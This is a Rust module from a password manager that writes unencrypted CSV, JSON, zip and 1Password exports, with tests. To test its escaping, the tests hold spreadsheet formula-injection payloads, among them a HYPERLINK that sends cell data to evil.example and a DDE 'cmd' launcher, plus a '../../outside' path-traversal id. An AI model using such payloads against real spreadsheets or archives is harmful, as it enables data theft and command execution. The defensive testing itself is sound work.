//! Unencrypted exports, for moving to another password manager.
//!
//! - CSV in Bitwarden's layout (`folder,favorite,type,name,notes,fields,
//!   reprompt,login_uri,login_username,login_password,login_totp`), which
//!   Bitwarden, 1Password and Keyless import. Items that are not logins are
//!   written as notes with their fields in the `fields` column, so nothing is
//!   lost.
//! - JSON with every item as Keyless stores it.
//! - A zip archive with that JSON (`keyless-export.json`) and the attached
//!   files in `attachments/<attachment id>/<name>`, as Bitwarden lays them
//!   out; each attachment in the JSON names its file.
//! - A 1Password export (`.1pux`): `export.data` and the files in
//!   `files/<document id>__<name>`, which 1Password (and Keyless) import.
//!
//! Passkeys are never exported (as with 1Password): their private keys would
//! sit in plain text, and no other password manager imports Keyless's.
//!
//! Both hold every secret in plain text: the app asks for the master password
//! and warns before writing one.
//!
//! A CSV cell a spreadsheet would run as a formula (a website can choose an
//! item's title and user name when it saves a passkey) is written with a
//! leading `'`, which Keyless removes again on import. Passwords, one-time
//! password secrets and notes are written as they are.

use std::{
    collections::HashMap,
    io::{Seek, Write},
};

use serde::Serialize;
use zip::{CompressionMethod, write::SimpleFileOptions};

use crate::{
    Error, Result,
    attachment::{Attachment, clean_name},
    backup::BackupData,
    item::{Category, Field, FieldKind, FieldPurpose, ItemDetails, ItemOverview},
};

const CSV_HEADER: [&str; 11] =
    ["folder", "favorite", "type", "name", "notes", "fields", "reprompt", "login_uri", "login_username", "login_password", "login_totp"];

/// One line per value: a field's value may not contain line breaks in the
/// `fields` column.
fn one_line(value: &str) -> String {
    value.split(['\r', '\n']).filter(|l| !l.is_empty()).collect::<Vec<_>>().join(" ")
}

/// Whether a spreadsheet would read `value` as a formula that can run
/// something or send data out: anything starting with `=`, and `+`, `-` or
/// `@` followed by a function call or a link to another program. Phone
/// numbers (`+55 11 …`) and handles (`@name`) are left alone.
fn formula(value: &str) -> bool {
    let call = || {
        value.match_indices('(').any(|(i, _)| value[..i].trim_end().chars().next_back().is_some_and(|c| c.is_ascii_alphabetic() || c == '_' || c == '.'))
    };
    match value.chars().next() {
        Some('=' | '\t' | '\r') => true,
        Some('+' | '-' | '@') => value.contains('|') || call(),
        _ => false,
    }
}

/// `value` as a spreadsheet shows it, never run.
fn spreadsheet_safe(value: String) -> String {
    if formula(&value) { format!("'{value}") } else { value }
}

/// Undoes [`spreadsheet_safe`] for a cell read back.
pub(crate) fn from_spreadsheet(value: String) -> String {
    match value.strip_prefix('\'') {
        Some(rest) if formula(rest) => rest.to_string(),
        _ => value,
    }
}

fn row(overview: &ItemOverview, details: &ItemDetails) -> [String; 11] {
    let login = matches!(overview.category, Category::Login | Category::Password);
    let username = details.field_by_purpose(FieldPurpose::Username);
    let password = details.field_by_purpose(FieldPurpose::Password);
    let totp = details.all_fields().find(|f| f.kind == FieldKind::Totp && !f.value.is_empty());
    let main = |f: &Field| login && [username, password, totp].iter().any(|m| m.is_some_and(|m| std::ptr::eq(m, f)));
    let fields = details
        .all_fields()
        .filter(|f| !f.value.is_empty() && !main(f))
        .map(|f| format!("{}: {}", one_line(&f.label), one_line(&f.value)))
        .collect::<Vec<_>>()
        .join("\n");
    let value = |field: Option<&Field>| if login { field.map(|f| f.value.clone()).unwrap_or_default() } else { String::new() };
    [
        spreadsheet_safe(overview.tags.join(", ")),
        if overview.favorite { "1".into() } else { String::new() },
        if login { "login".into() } else { "note".into() },
        spreadsheet_safe(overview.title.clone()),
        details.notes.clone(),
        spreadsheet_safe(fields),
        "0".into(),
        spreadsheet_safe(overview.urls.iter().map(|u| u.href.as_str()).collect::<Vec<_>>().join(",")),
        spreadsheet_safe(value(username)),
        value(password),
        value(totp),
    ]
}

pub fn to_csv(data: &BackupData) -> Result<Vec<u8>> {
    let mut writer = csv::Writer::from_writer(Vec::new());
    let fail = |e: csv::Error| Error::Import(format!("CSV export failed: {e}"));
    writer.write_record(CSV_HEADER).map_err(fail)?;
    for item in data.vaults.iter().flat_map(|v| &v.items) {
        writer.write_record(row(&item.overview, &item.details)).map_err(fail)?;
    }
    writer.into_inner().map_err(|e| Error::Import(format!("CSV export failed: {e}")))
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct JsonExport<'a> {
    format: &'static str,
    version: u32,
    #[serde(flatten)]
    data: &'a BackupData,
}

pub fn to_json(data: &BackupData) -> Result<Vec<u8>> {
    json_with_files(data, &HashMap::new())
}

/// The JSON export; attachments in `files` (by id) name their file in the
/// archive.
fn json_with_files(data: &BackupData, files: &HashMap<String, String>) -> Result<Vec<u8>> {
    let mut value = serde_json::to_value(JsonExport { format: "keyless-export", version: 1, data })?;
    // The files are not encrypted in an export, so their keys mean nothing.
    // (`get_mut`, not indexing: indexing adds the key when it is missing.)
    for vault in value.get_mut("vaults").and_then(serde_json::Value::as_array_mut).into_iter().flatten() {
        for item in vault.get_mut("items").and_then(serde_json::Value::as_array_mut).into_iter().flatten() {
            if let Some(details) = item.get_mut("details").and_then(serde_json::Value::as_object_mut) {
                details.remove("passkeys");
            }
            let attachments = item.get_mut("details").and_then(|d| d.get_mut("attachments")).and_then(serde_json::Value::as_array_mut);
            for attachment in attachments.into_iter().flatten() {
                if let Some(entry) = attachment.as_object_mut() {
                    entry.remove("key");
                    let path = entry.get("id").and_then(|id| id.as_str()).and_then(|id| files.get(id));
                    if let Some(path) = path.cloned() {
                        entry.insert("file".into(), path.into());
                    }
                }
            }
        }
    }
    serde_json::to_vec_pretty(&value).map_err(Error::from)
}

/// The layout of a zip export.
#[derive(Clone, Copy, PartialEq, Eq)]
pub enum ZipLayout {
    /// Keyless's JSON and `attachments/`.
    Keyless,
    /// 1Password's `.1pux`.
    OnePux,
}

/// Writes the zip export: the attached files first, as they are downloaded
/// and decrypted, then the JSON.
pub struct ExportZip<W: Write + Seek> {
    zip: zip::ZipWriter<W>,
    layout: ZipLayout,
    /// The path of each attachment's file written whole, by attachment id.
    written: HashMap<String, String>,
    /// The file being written: attachment id and path.
    current: Option<(String, String)>,
}

impl<W: Write + Seek> ExportZip<W> {
    pub fn new(out: W) -> Self {
        Self::with_layout(out, ZipLayout::Keyless)
    }

    pub fn with_layout(out: W, layout: ZipLayout) -> Self {
        Self { zip: zip::ZipWriter::new(out), layout, written: HashMap::new(), current: None }
    }

    fn fail(e: impl std::fmt::Display) -> Error {
        Error::Import(format!("could not write the export: {e}"))
    }

    /// Starts `attachment`'s file; its contents follow, then
    /// [`ExportZip::end_file`] or [`ExportZip::abort_file`].
    pub fn start_file(&mut self, attachment: &Attachment) -> Result<()> {
        // The folder is named after the attachment only when its id is what
        // Keyless makes (another vault member could have chosen any text).
        let folder = match uuid::Uuid::parse_str(&attachment.id) {
            Ok(id) => id.hyphenated().to_string(),
            Err(_) => uuid::Uuid::new_v4().to_string(),
        };
        let path = match self.layout {
            ZipLayout::Keyless => format!("attachments/{folder}/{}", clean_name(&attachment.name)),
            ZipLayout::OnePux => format!("files/{folder}__{}", clean_name(&attachment.name)),
        };
        let options = SimpleFileOptions::default()
            .compression_method(CompressionMethod::Deflated)
            .large_file(attachment.size >= u32::MAX as u64);
        self.zip.start_file(path.as_str(), options).map_err(Self::fail)?;
        self.current = Some((attachment.id.clone(), path));
        Ok(())
    }

    pub fn write(&mut self, plaintext: &[u8]) -> Result<()> {
        self.zip.write_all(plaintext).map_err(Self::fail)
    }

    /// The file started last is complete.
    pub fn end_file(&mut self) {
        if let Some((id, path)) = self.current.take() {
            self.written.insert(id, path);
        }
    }

    /// Leaves out the file being written (it could not be read whole), if
    /// one is (the zip writer would otherwise drop the one before).
    pub fn abort_file(&mut self) -> Result<()> {
        match self.current.take() {
            Some(_) => self.zip.abort_file().map_err(Self::fail),
            None => Ok(()),
        }
    }

    /// Writes the JSON and ends the archive.
    pub fn finish(mut self, data: &BackupData) -> Result<W> {
        let options = SimpleFileOptions::default().compression_method(CompressionMethod::Deflated);
        match self.layout {
            ZipLayout::Keyless => {
                let json = zeroize::Zeroizing::new(json_with_files(data, &self.written)?);
                self.zip.start_file("keyless-export.json", options).map_err(Self::fail)?;
                self.zip.write_all(&json).map_err(Self::fail)?;
            }
            ZipLayout::OnePux => {
                let attributes = serde_json::json!({ "version": 3, "description": "1Password Unencrypted Export", "createdAt": data.exported_at });
                self.zip.start_file("export.attributes", options).map_err(Self::fail)?;
                self.zip.write_all(&serde_json::to_vec_pretty(&attributes)?).map_err(Self::fail)?;
                let json = zeroize::Zeroizing::new(onepux_data(data, &self.written)?);
                self.zip.start_file("export.data", options).map_err(Self::fail)?;
                self.zip.write_all(&json).map_err(Self::fail)?;
            }
        }
        self.zip.finish().map_err(Self::fail)
    }
}

// ----- 1PUX --------------------------------------------------------------------------

fn onepux_category(category: Category) -> &'static str {
    match category {
        Category::Login => "001",
        Category::CreditCard => "002",
        Category::Identity => "004",
        Category::Password => "005",
        Category::Document => "006",
        Category::SoftwareLicense => "100",
        Category::BankAccount => "101",
        Category::Database => "102",
        Category::DriverLicense => "103",
        Category::Membership => "105",
        Category::Passport => "106",
        Category::WirelessRouter => "109",
        Category::Server => "110",
        Category::EmailAccount => "111",
        Category::ApiCredential => "112",
        Category::MedicalRecord => "113",
        Category::SshKey => "114",
        Category::CryptoWallet => "115",
        // 1Password has no kind of its own for the rest.
        Category::SecureNote | Category::Other => "003",
    }
}

/// A field as 1Password writes it: `{"title", "id", "value": {kind: …}}`.
fn onepux_field(field: &Field, index: usize) -> Option<serde_json::Value> {
    use serde_json::json;
    let v = field.value.as_str();
    let value = match field.kind {
        FieldKind::Concealed | FieldKind::Pin | FieldKind::SecurityQuestion => json!({ "concealed": v }),
        FieldKind::Email => json!({ "email": { "email_address": v, "provider": null } }),
        FieldKind::Url => json!({ "url": v }),
        FieldKind::Phone => json!({ "phone": v }),
        FieldKind::Totp => json!({ "totp": v }),
        FieldKind::CardNumber => json!({ "creditCardNumber": v }),
        FieldKind::Date => match crate::import::bitwarden::date(Some(&serde_json::Value::String(v.to_string()))) {
            0 => json!({ "string": v }),
            secs => json!({ "date": secs }),
        },
        FieldKind::MonthYear => {
            let parts: Vec<&str> = v.split(|c: char| !c.is_ascii_digit()).filter(|p| !p.is_empty()).collect();
            match parts.as_slice() {
                [month, year] if year.len() == 4 => json!({ "monthYear": format!("{year}{month:0>2}").parse::<i64>().unwrap_or(0) }),
                _ => json!({ "string": v }),
            }
        }
        FieldKind::Address => match &field.extra.address {
            Some(a) => {
                let street = [a.street.as_str(), a.line2.as_str()].iter().filter(|s| !s.is_empty()).copied().collect::<Vec<_>>().join(", ");
                json!({ "address": { "street": street, "city": a.city, "state": a.state, "zip": a.zip, "country": a.country } })
            }
            None => json!({ "string": v }),
        },
        FieldKind::Reference => json!({ "reference": v }),
        FieldKind::File => return None,
        _ => json!({ "string": v }),
    };
    if v.trim().is_empty() && field.kind != FieldKind::Address {
        return None;
    }
    Some(json!({
        "title": field.label,
        "id": field.id,
        "value": value,
        "indexAtSource": index,
        "guarded": false,
        "multiline": field.kind == FieldKind::Multiline,
        "dontGenerate": false,
        "inputTraits": { "keyboard": "default", "correction": "default", "capitalization": "default" },
    }))
}

/// `export.data`: an account, the vaults, the items; `files` are the
/// attachments written to the archive (by id, their paths).
pub fn onepux_data(data: &BackupData, files: &HashMap<String, String>) -> Result<Vec<u8>> {
    use serde_json::json;
    let file_of = |attachment: &Attachment| {
        let path = files.get(&attachment.id)?;
        let (document, name) = path.strip_prefix("files/")?.split_once("__")?;
        Some(json!({ "fileName": name, "documentId": document, "decryptedSize": attachment.size }))
    };
    let vaults: Vec<serde_json::Value> = data
        .vaults
        .iter()
        .enumerate()
        .map(|(index, vault)| {
            let items: Vec<serde_json::Value> = vault
                .items
                .iter()
                .enumerate()
                .map(|(position, item)| {
                    let (o, d) = (&item.overview, &item.details);
                    let username = d.field_by_purpose(FieldPurpose::Username);
                    let password = d.field_by_purpose(FieldPurpose::Password);
                    let mut login_fields = Vec::new();
                    if o.category != Category::Password {
                        if let Some(user) = username {
                            login_fields.push(json!({ "value": user.value, "name": "username", "fieldType": "T", "designation": "username" }));
                        }
                        if let Some(pass) = password {
                            login_fields.push(json!({ "value": pass.value, "name": "password", "fieldType": "P", "designation": "password" }));
                        }
                    }
                    let skip = |f: &Field| o.category != Category::Password && (Some(f.id.as_str()) == username.map(|u| u.id.as_str()) || Some(f.id.as_str()) == password.map(|p| p.id.as_str()));
                    let mut main: Vec<serde_json::Value> = d.fields.iter().filter(|f| !skip(f) && !(o.category == Category::Password && f.purpose == Some(FieldPurpose::Password))).enumerate().filter_map(|(i, f)| onepux_field(f, i)).collect();
                    // Files: the document's own, and fields for the others.
                    let mut document = None;
                    for attachment in &d.attachments {
                        let Some(file) = file_of(attachment) else { continue };
                        if o.category == Category::Document && document.is_none() {
                            document = Some(file);
                        } else {
                            main.push(json!({ "title": attachment.name, "id": attachment.id, "value": { "file": file } }));
                        }
                    }
                    let mut sections = vec![json!({ "title": "", "name": "add more", "fields": main })];
                    for section in &d.sections {
                        let fields: Vec<serde_json::Value> = section.fields.iter().enumerate().filter_map(|(i, f)| onepux_field(f, i)).collect();
                        sections.push(json!({ "title": section.title, "name": section.id, "fields": fields }));
                    }
                    let mut details = json!({
                        "loginFields": login_fields,
                        "notesPlain": d.notes,
                        "sections": sections,
                        "passwordHistory": d.password_history.iter().map(|h| json!({ "value": h.value, "time": h.changed_at })).collect::<Vec<_>>(),
                    });
                    if o.category == Category::Password
                        && let Some(pass) = password
                    {
                        details["password"] = json!(pass.value);
                    }
                    if let Some(document) = document {
                        details["documentAttributes"] = document;
                    }
                    let uuid = if item.id.is_empty() { format!("keyless{index}x{position}") } else { item.id.clone() };
                    json!({
                        "uuid": uuid,
                        "favIndex": if o.favorite { 1 } else { 0 },
                        "createdAt": o.created_at,
                        "updatedAt": o.updated_at,
                        "state": if o.archived { "archived" } else { "active" },
                        "categoryUuid": onepux_category(o.category),
                        "details": details,
                        "overview": {
                            "subtitle": o.subtitle,
                            "title": o.title,
                            "url": o.urls.first().map(|u| u.href.clone()).unwrap_or_default(),
                            "urls": o.urls.iter().map(|u| json!({ "label": u.label, "url": u.href, "mode": "default" })).collect::<Vec<_>>(),
                            "tags": o.tags,
                            "ps": 0,
                            "pbe": 0.0,
                            "pgrng": false,
                        },
                    })
                })
                .collect();
            json!({ "attrs": { "uuid": format!("vault{index}"), "desc": vault.description, "avatar": "", "name": vault.name, "type": "U" }, "items": items })
        })
        .collect();
    let document = json!({ "accounts": [{ "attrs": { "accountName": "Keyless", "name": "Keyless", "avatar": "", "email": "", "uuid": "keyless", "domain": "" }, "vaults": vaults }] });
    serde_json::to_vec_pretty(&document).map_err(Error::from)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{
        backup::{BackupItem, BackupVault},
        import::csv::parse_csv,
        item::ItemUrl,
    };

    fn field(label: &str, kind: FieldKind, value: &str, purpose: Option<FieldPurpose>) -> Field {
        Field { id: label.into(), label: label.into(), kind, value: value.into(), purpose, extra: Default::default() }
    }

    fn sample() -> BackupData {
        let mut login = ItemDetails::default();
        login.fields = vec![
            field("username", FieldKind::Text, "ana@example.com", Some(FieldPurpose::Username)),
            field("password", FieldKind::Concealed, "p,a\"ss\nword", Some(FieldPurpose::Password)),
            field("one-time password", FieldKind::Totp, "otpauth://totp/x?secret=JBSWY3DPEHPK3PXP", None),
            field("recovery", FieldKind::Concealed, "code-1\ncode-2", None),
        ];
        login.notes = "first line\nsecond line".into();
        let mut card = ItemDetails::default();
        card.fields = vec![field("number", FieldKind::CardNumber, "4111111111111111", None), field("expiry date", FieldKind::MonthYear, "05/2027", None)];
        BackupData {
            exported_at: 1,
            vaults: vec![BackupVault {
                name: "Personal".into(),
                description: String::new(),
                items: vec![
                    BackupItem {
                        id: String::new(),
                        overview: ItemOverview {
                            title: "Example".into(),
                            category: Category::Login,
                            urls: vec![ItemUrl { href: "https://example.com".into(), ..Default::default() }, ItemUrl { href: "https://example.org".into(), ..Default::default() }],
                            tags: vec!["work".into()],
                            favorite: true,
                            ..Default::default()
                        },
                        details: login,
                    },
                    BackupItem { id: String::new(), overview: ItemOverview { title: "Visa".into(), category: Category::CreditCard, ..Default::default() }, details: card },
                ],
            }],
        }
    }

    #[test]
    fn csv_round_trip() {
        let csv = to_csv(&sample()).unwrap();
        let text = String::from_utf8(csv.clone()).unwrap();
        assert!(text.starts_with("folder,favorite,type,name,notes,fields,reprompt,login_uri,login_username,login_password,login_totp\n"));
        let imported = parse_csv(csv.as_slice(), "Personal").unwrap();
        let items = &imported.vaults[0].items;
        assert_eq!(items.len(), 2);
        let login = &items[0];
        assert_eq!(login.overview.title, "Example");
        assert!(login.overview.favorite);
        assert_eq!(login.overview.tags, ["work"]);
        assert_eq!(login.overview.urls.iter().map(|u| u.href.as_str()).collect::<Vec<_>>(), ["https://example.com", "https://example.org"]);
        assert_eq!(login.details.password(), Some("p,a\"ss\nword"));
        assert_eq!(login.details.username(), Some("ana@example.com"));
        assert!(login.details.all_fields().any(|f| f.kind == FieldKind::Totp && f.value.starts_with("otpauth://")));
        assert!(login.details.all_fields().any(|f| f.label == "recovery" && f.value == "code-1 code-2"));
        assert_eq!(login.details.notes, "first line\nsecond line");
        let card = &items[1];
        assert_eq!(card.overview.category, Category::SecureNote);
        assert!(card.details.all_fields().any(|f| f.label == "number" && f.value == "4111111111111111"));
    }

    #[test]
    fn formulas_are_not_run() {
        for (value, escaped) in [
            ("=HYPERLINK(\"https://x/?\"&J5,\"x\")", true),
            ("+HYPERLINK(\"https://x\")", true),
            ("-cmd|' /C calc'!A0", true),
            ("@SUM(A1:A9)", true),
            ("\tx", true),
            ("+55 (11) 99999-9999", false),
            ("@diego", false),
            ("- shopping list", false),
            ("Example", false),
        ] {
            let safe = spreadsheet_safe(value.to_string());
            assert_eq!(safe.starts_with('\''), escaped, "{value}");
            assert_eq!(from_spreadsheet(safe), value);
        }

        let mut data = sample();
        let item = &mut data.vaults[0].items[0];
        item.overview.title = "=HYPERLINK(\"https://evil.example/?\"&J2,\"Open\")".into();
        item.details.fields[0].value = "+SUM(1)".into();
        item.details.fields[1].value = "=not-a-formula-but-a-password".into();
        let csv = to_csv(&data).unwrap();
        let text = String::from_utf8(csv.clone()).unwrap();
        assert!(text.contains("\"'=HYPERLINK("));
        assert!(text.contains(",'+SUM(1),=not-a-formula-but-a-password,"));
        let imported = parse_csv(csv.as_slice(), "Personal").unwrap();
        let login = &imported.vaults[0].items[0];
        assert_eq!(login.overview.title, "=HYPERLINK(\"https://evil.example/?\"&J2,\"Open\")");
        assert_eq!(login.details.username(), Some("+SUM(1)"));
        assert_eq!(login.details.password(), Some("=not-a-formula-but-a-password"));
    }

    #[test]
    fn json_has_everything() {
        let mut data = sample();
        data.vaults[0].items[0].details.attachments.push(crate::attachment::Attachment::new("scan.pdf", 10, 1).unwrap());
        let json: serde_json::Value = serde_json::from_slice(&to_json(&data).unwrap()).unwrap();
        assert_eq!(json["format"], "keyless-export");
        assert_eq!(json["vaults"][0]["items"][1]["details"]["fields"][1]["value"], "05/2027");
        // Attachments are listed, without their keys.
        let attachment = &json["vaults"][0]["items"][0]["details"]["attachments"][0];
        assert_eq!(attachment["name"], "scan.pdf");
        assert!(attachment.get("key").is_none());
        assert!(attachment.get("file").is_none());
        // Items without attachments do not get an empty list.
        assert!(json["vaults"][0]["items"][1]["details"].get("attachments").is_none());
    }

    #[test]
    fn passkeys_are_never_exported() {
        let mut data = sample();
        let passkey: crate::passkey::Passkey = serde_json::from_value(serde_json::json!({
            "credentialId": "Y3JlZA", "rpId": "example.com", "userHandle": "dQ", "key": "secret-private-key"
        }))
        .unwrap();
        data.vaults[0].items[0].details.passkeys.push(passkey);
        let json = String::from_utf8(to_json(&data).unwrap()).unwrap();
        assert!(!json.contains("passkeys") && !json.contains("secret-private-key"));
        let csv = String::from_utf8(to_csv(&data).unwrap()).unwrap();
        assert!(!csv.contains("secret-private-key"));
    }

    #[test]
    fn zip_has_the_files() {
        use std::io::{Cursor, Read};

        let mut data = sample();
        let scan = Attachment::new("../scan.pdf", 4, 1).unwrap();
        let mut forged = Attachment::new("notes.txt", 2, 1).unwrap();
        forged.id = "../../outside".into();
        let lost = Attachment::new("lost.txt", 1, 1).unwrap();
        data.vaults[0].items[0].details.attachments = vec![scan.clone(), forged.clone(), lost.clone()];

        let mut export = ExportZip::new(Cursor::new(Vec::new()));
        export.start_file(&scan).unwrap();
        export.write(b"%PDF").unwrap();
        export.end_file();
        export.start_file(&forged).unwrap();
        export.write(b"hi").unwrap();
        export.end_file();
        export.start_file(&lost).unwrap();
        export.write(b"?").unwrap();
        export.abort_file().unwrap();
        // Nothing to abort: the files before stay.
        export.abort_file().unwrap();
        let file = export.finish(&data).unwrap().into_inner();

        let mut archive = zip::ZipArchive::new(Cursor::new(file)).unwrap();
        let names: Vec<String> = archive.file_names().map(String::from).collect();
        assert_eq!(names.len(), 3);
        assert!(names.iter().all(|n| !n.contains("..")), "{names:?}");
        let scan_path = format!("attachments/{}/scan.pdf", scan.id);
        let mut contents = String::new();
        archive.by_name(&scan_path).unwrap().read_to_string(&mut contents).unwrap();
        assert_eq!(contents, "%PDF");

        let mut json = String::new();
        archive.by_name("keyless-export.json").unwrap().read_to_string(&mut json).unwrap();
        let json: serde_json::Value = serde_json::from_str(&json).unwrap();
        let listed = json["vaults"][0]["items"][0]["details"]["attachments"].as_array().unwrap();
        assert_eq!(listed[0]["file"], scan_path.as_str());
        let forged_path = listed[1]["file"].as_str().unwrap();
        assert!(forged_path.starts_with("attachments/") && forged_path.ends_with("/notes.txt") && !forged_path.contains(".."));
        assert!(names.iter().any(|n| n == forged_path));
        // The file that could not be read is listed without one.
        assert!(listed[2].get("file").is_none());
        assert!(listed.iter().all(|a| a.get("key").is_none()));
    }

    #[test]
    fn onepux_round_trip() {
        use std::io::Cursor;

        let mut data = sample();
        let mut passkeys = data.vaults[0].items[0].details.passkeys.clone();
        passkeys.push(serde_json::from_value(serde_json::json!({"credentialId": "Y3JlZA", "rpId": "example.com", "userHandle": "dQ", "key": "secret-private-key"})).unwrap());
        data.vaults[0].items[0].details.passkeys = passkeys;
        let scan = Attachment::new("scan.pdf", 4, 1).unwrap();
        data.vaults[0].items[0].details.attachments.push(scan.clone());
        let mut zip = ExportZip::with_layout(Cursor::new(Vec::new()), ZipLayout::OnePux);
        zip.start_file(&scan).unwrap();
        zip.write(b"%PDF").unwrap();
        zip.end_file();
        let bytes = zip.finish(&data).unwrap().into_inner();
        let text = String::from_utf8_lossy(&bytes);
        assert!(!text.contains("secret-private-key"), "passkeys stay out");

        let result = crate::import::onepux::parse_1pux(Cursor::new(bytes)).unwrap();
        let items = &result.vaults[0].items;
        assert_eq!(items.len(), data.vaults[0].items.len());
        let login = &items[0];
        assert_eq!(login.overview.title, "Example");
        assert_eq!(login.details.username(), Some("ana@example.com"));
        assert_eq!(login.details.password(), Some("p,a\"ss\nword"));
        assert!(login.details.fields.iter().any(|f| f.kind == FieldKind::Totp));
        assert_eq!(login.files.len(), 1);
        assert_eq!(login.files[0].name, "scan.pdf");
        assert_eq!(items[1].overview.category, Category::CreditCard);
    }
}
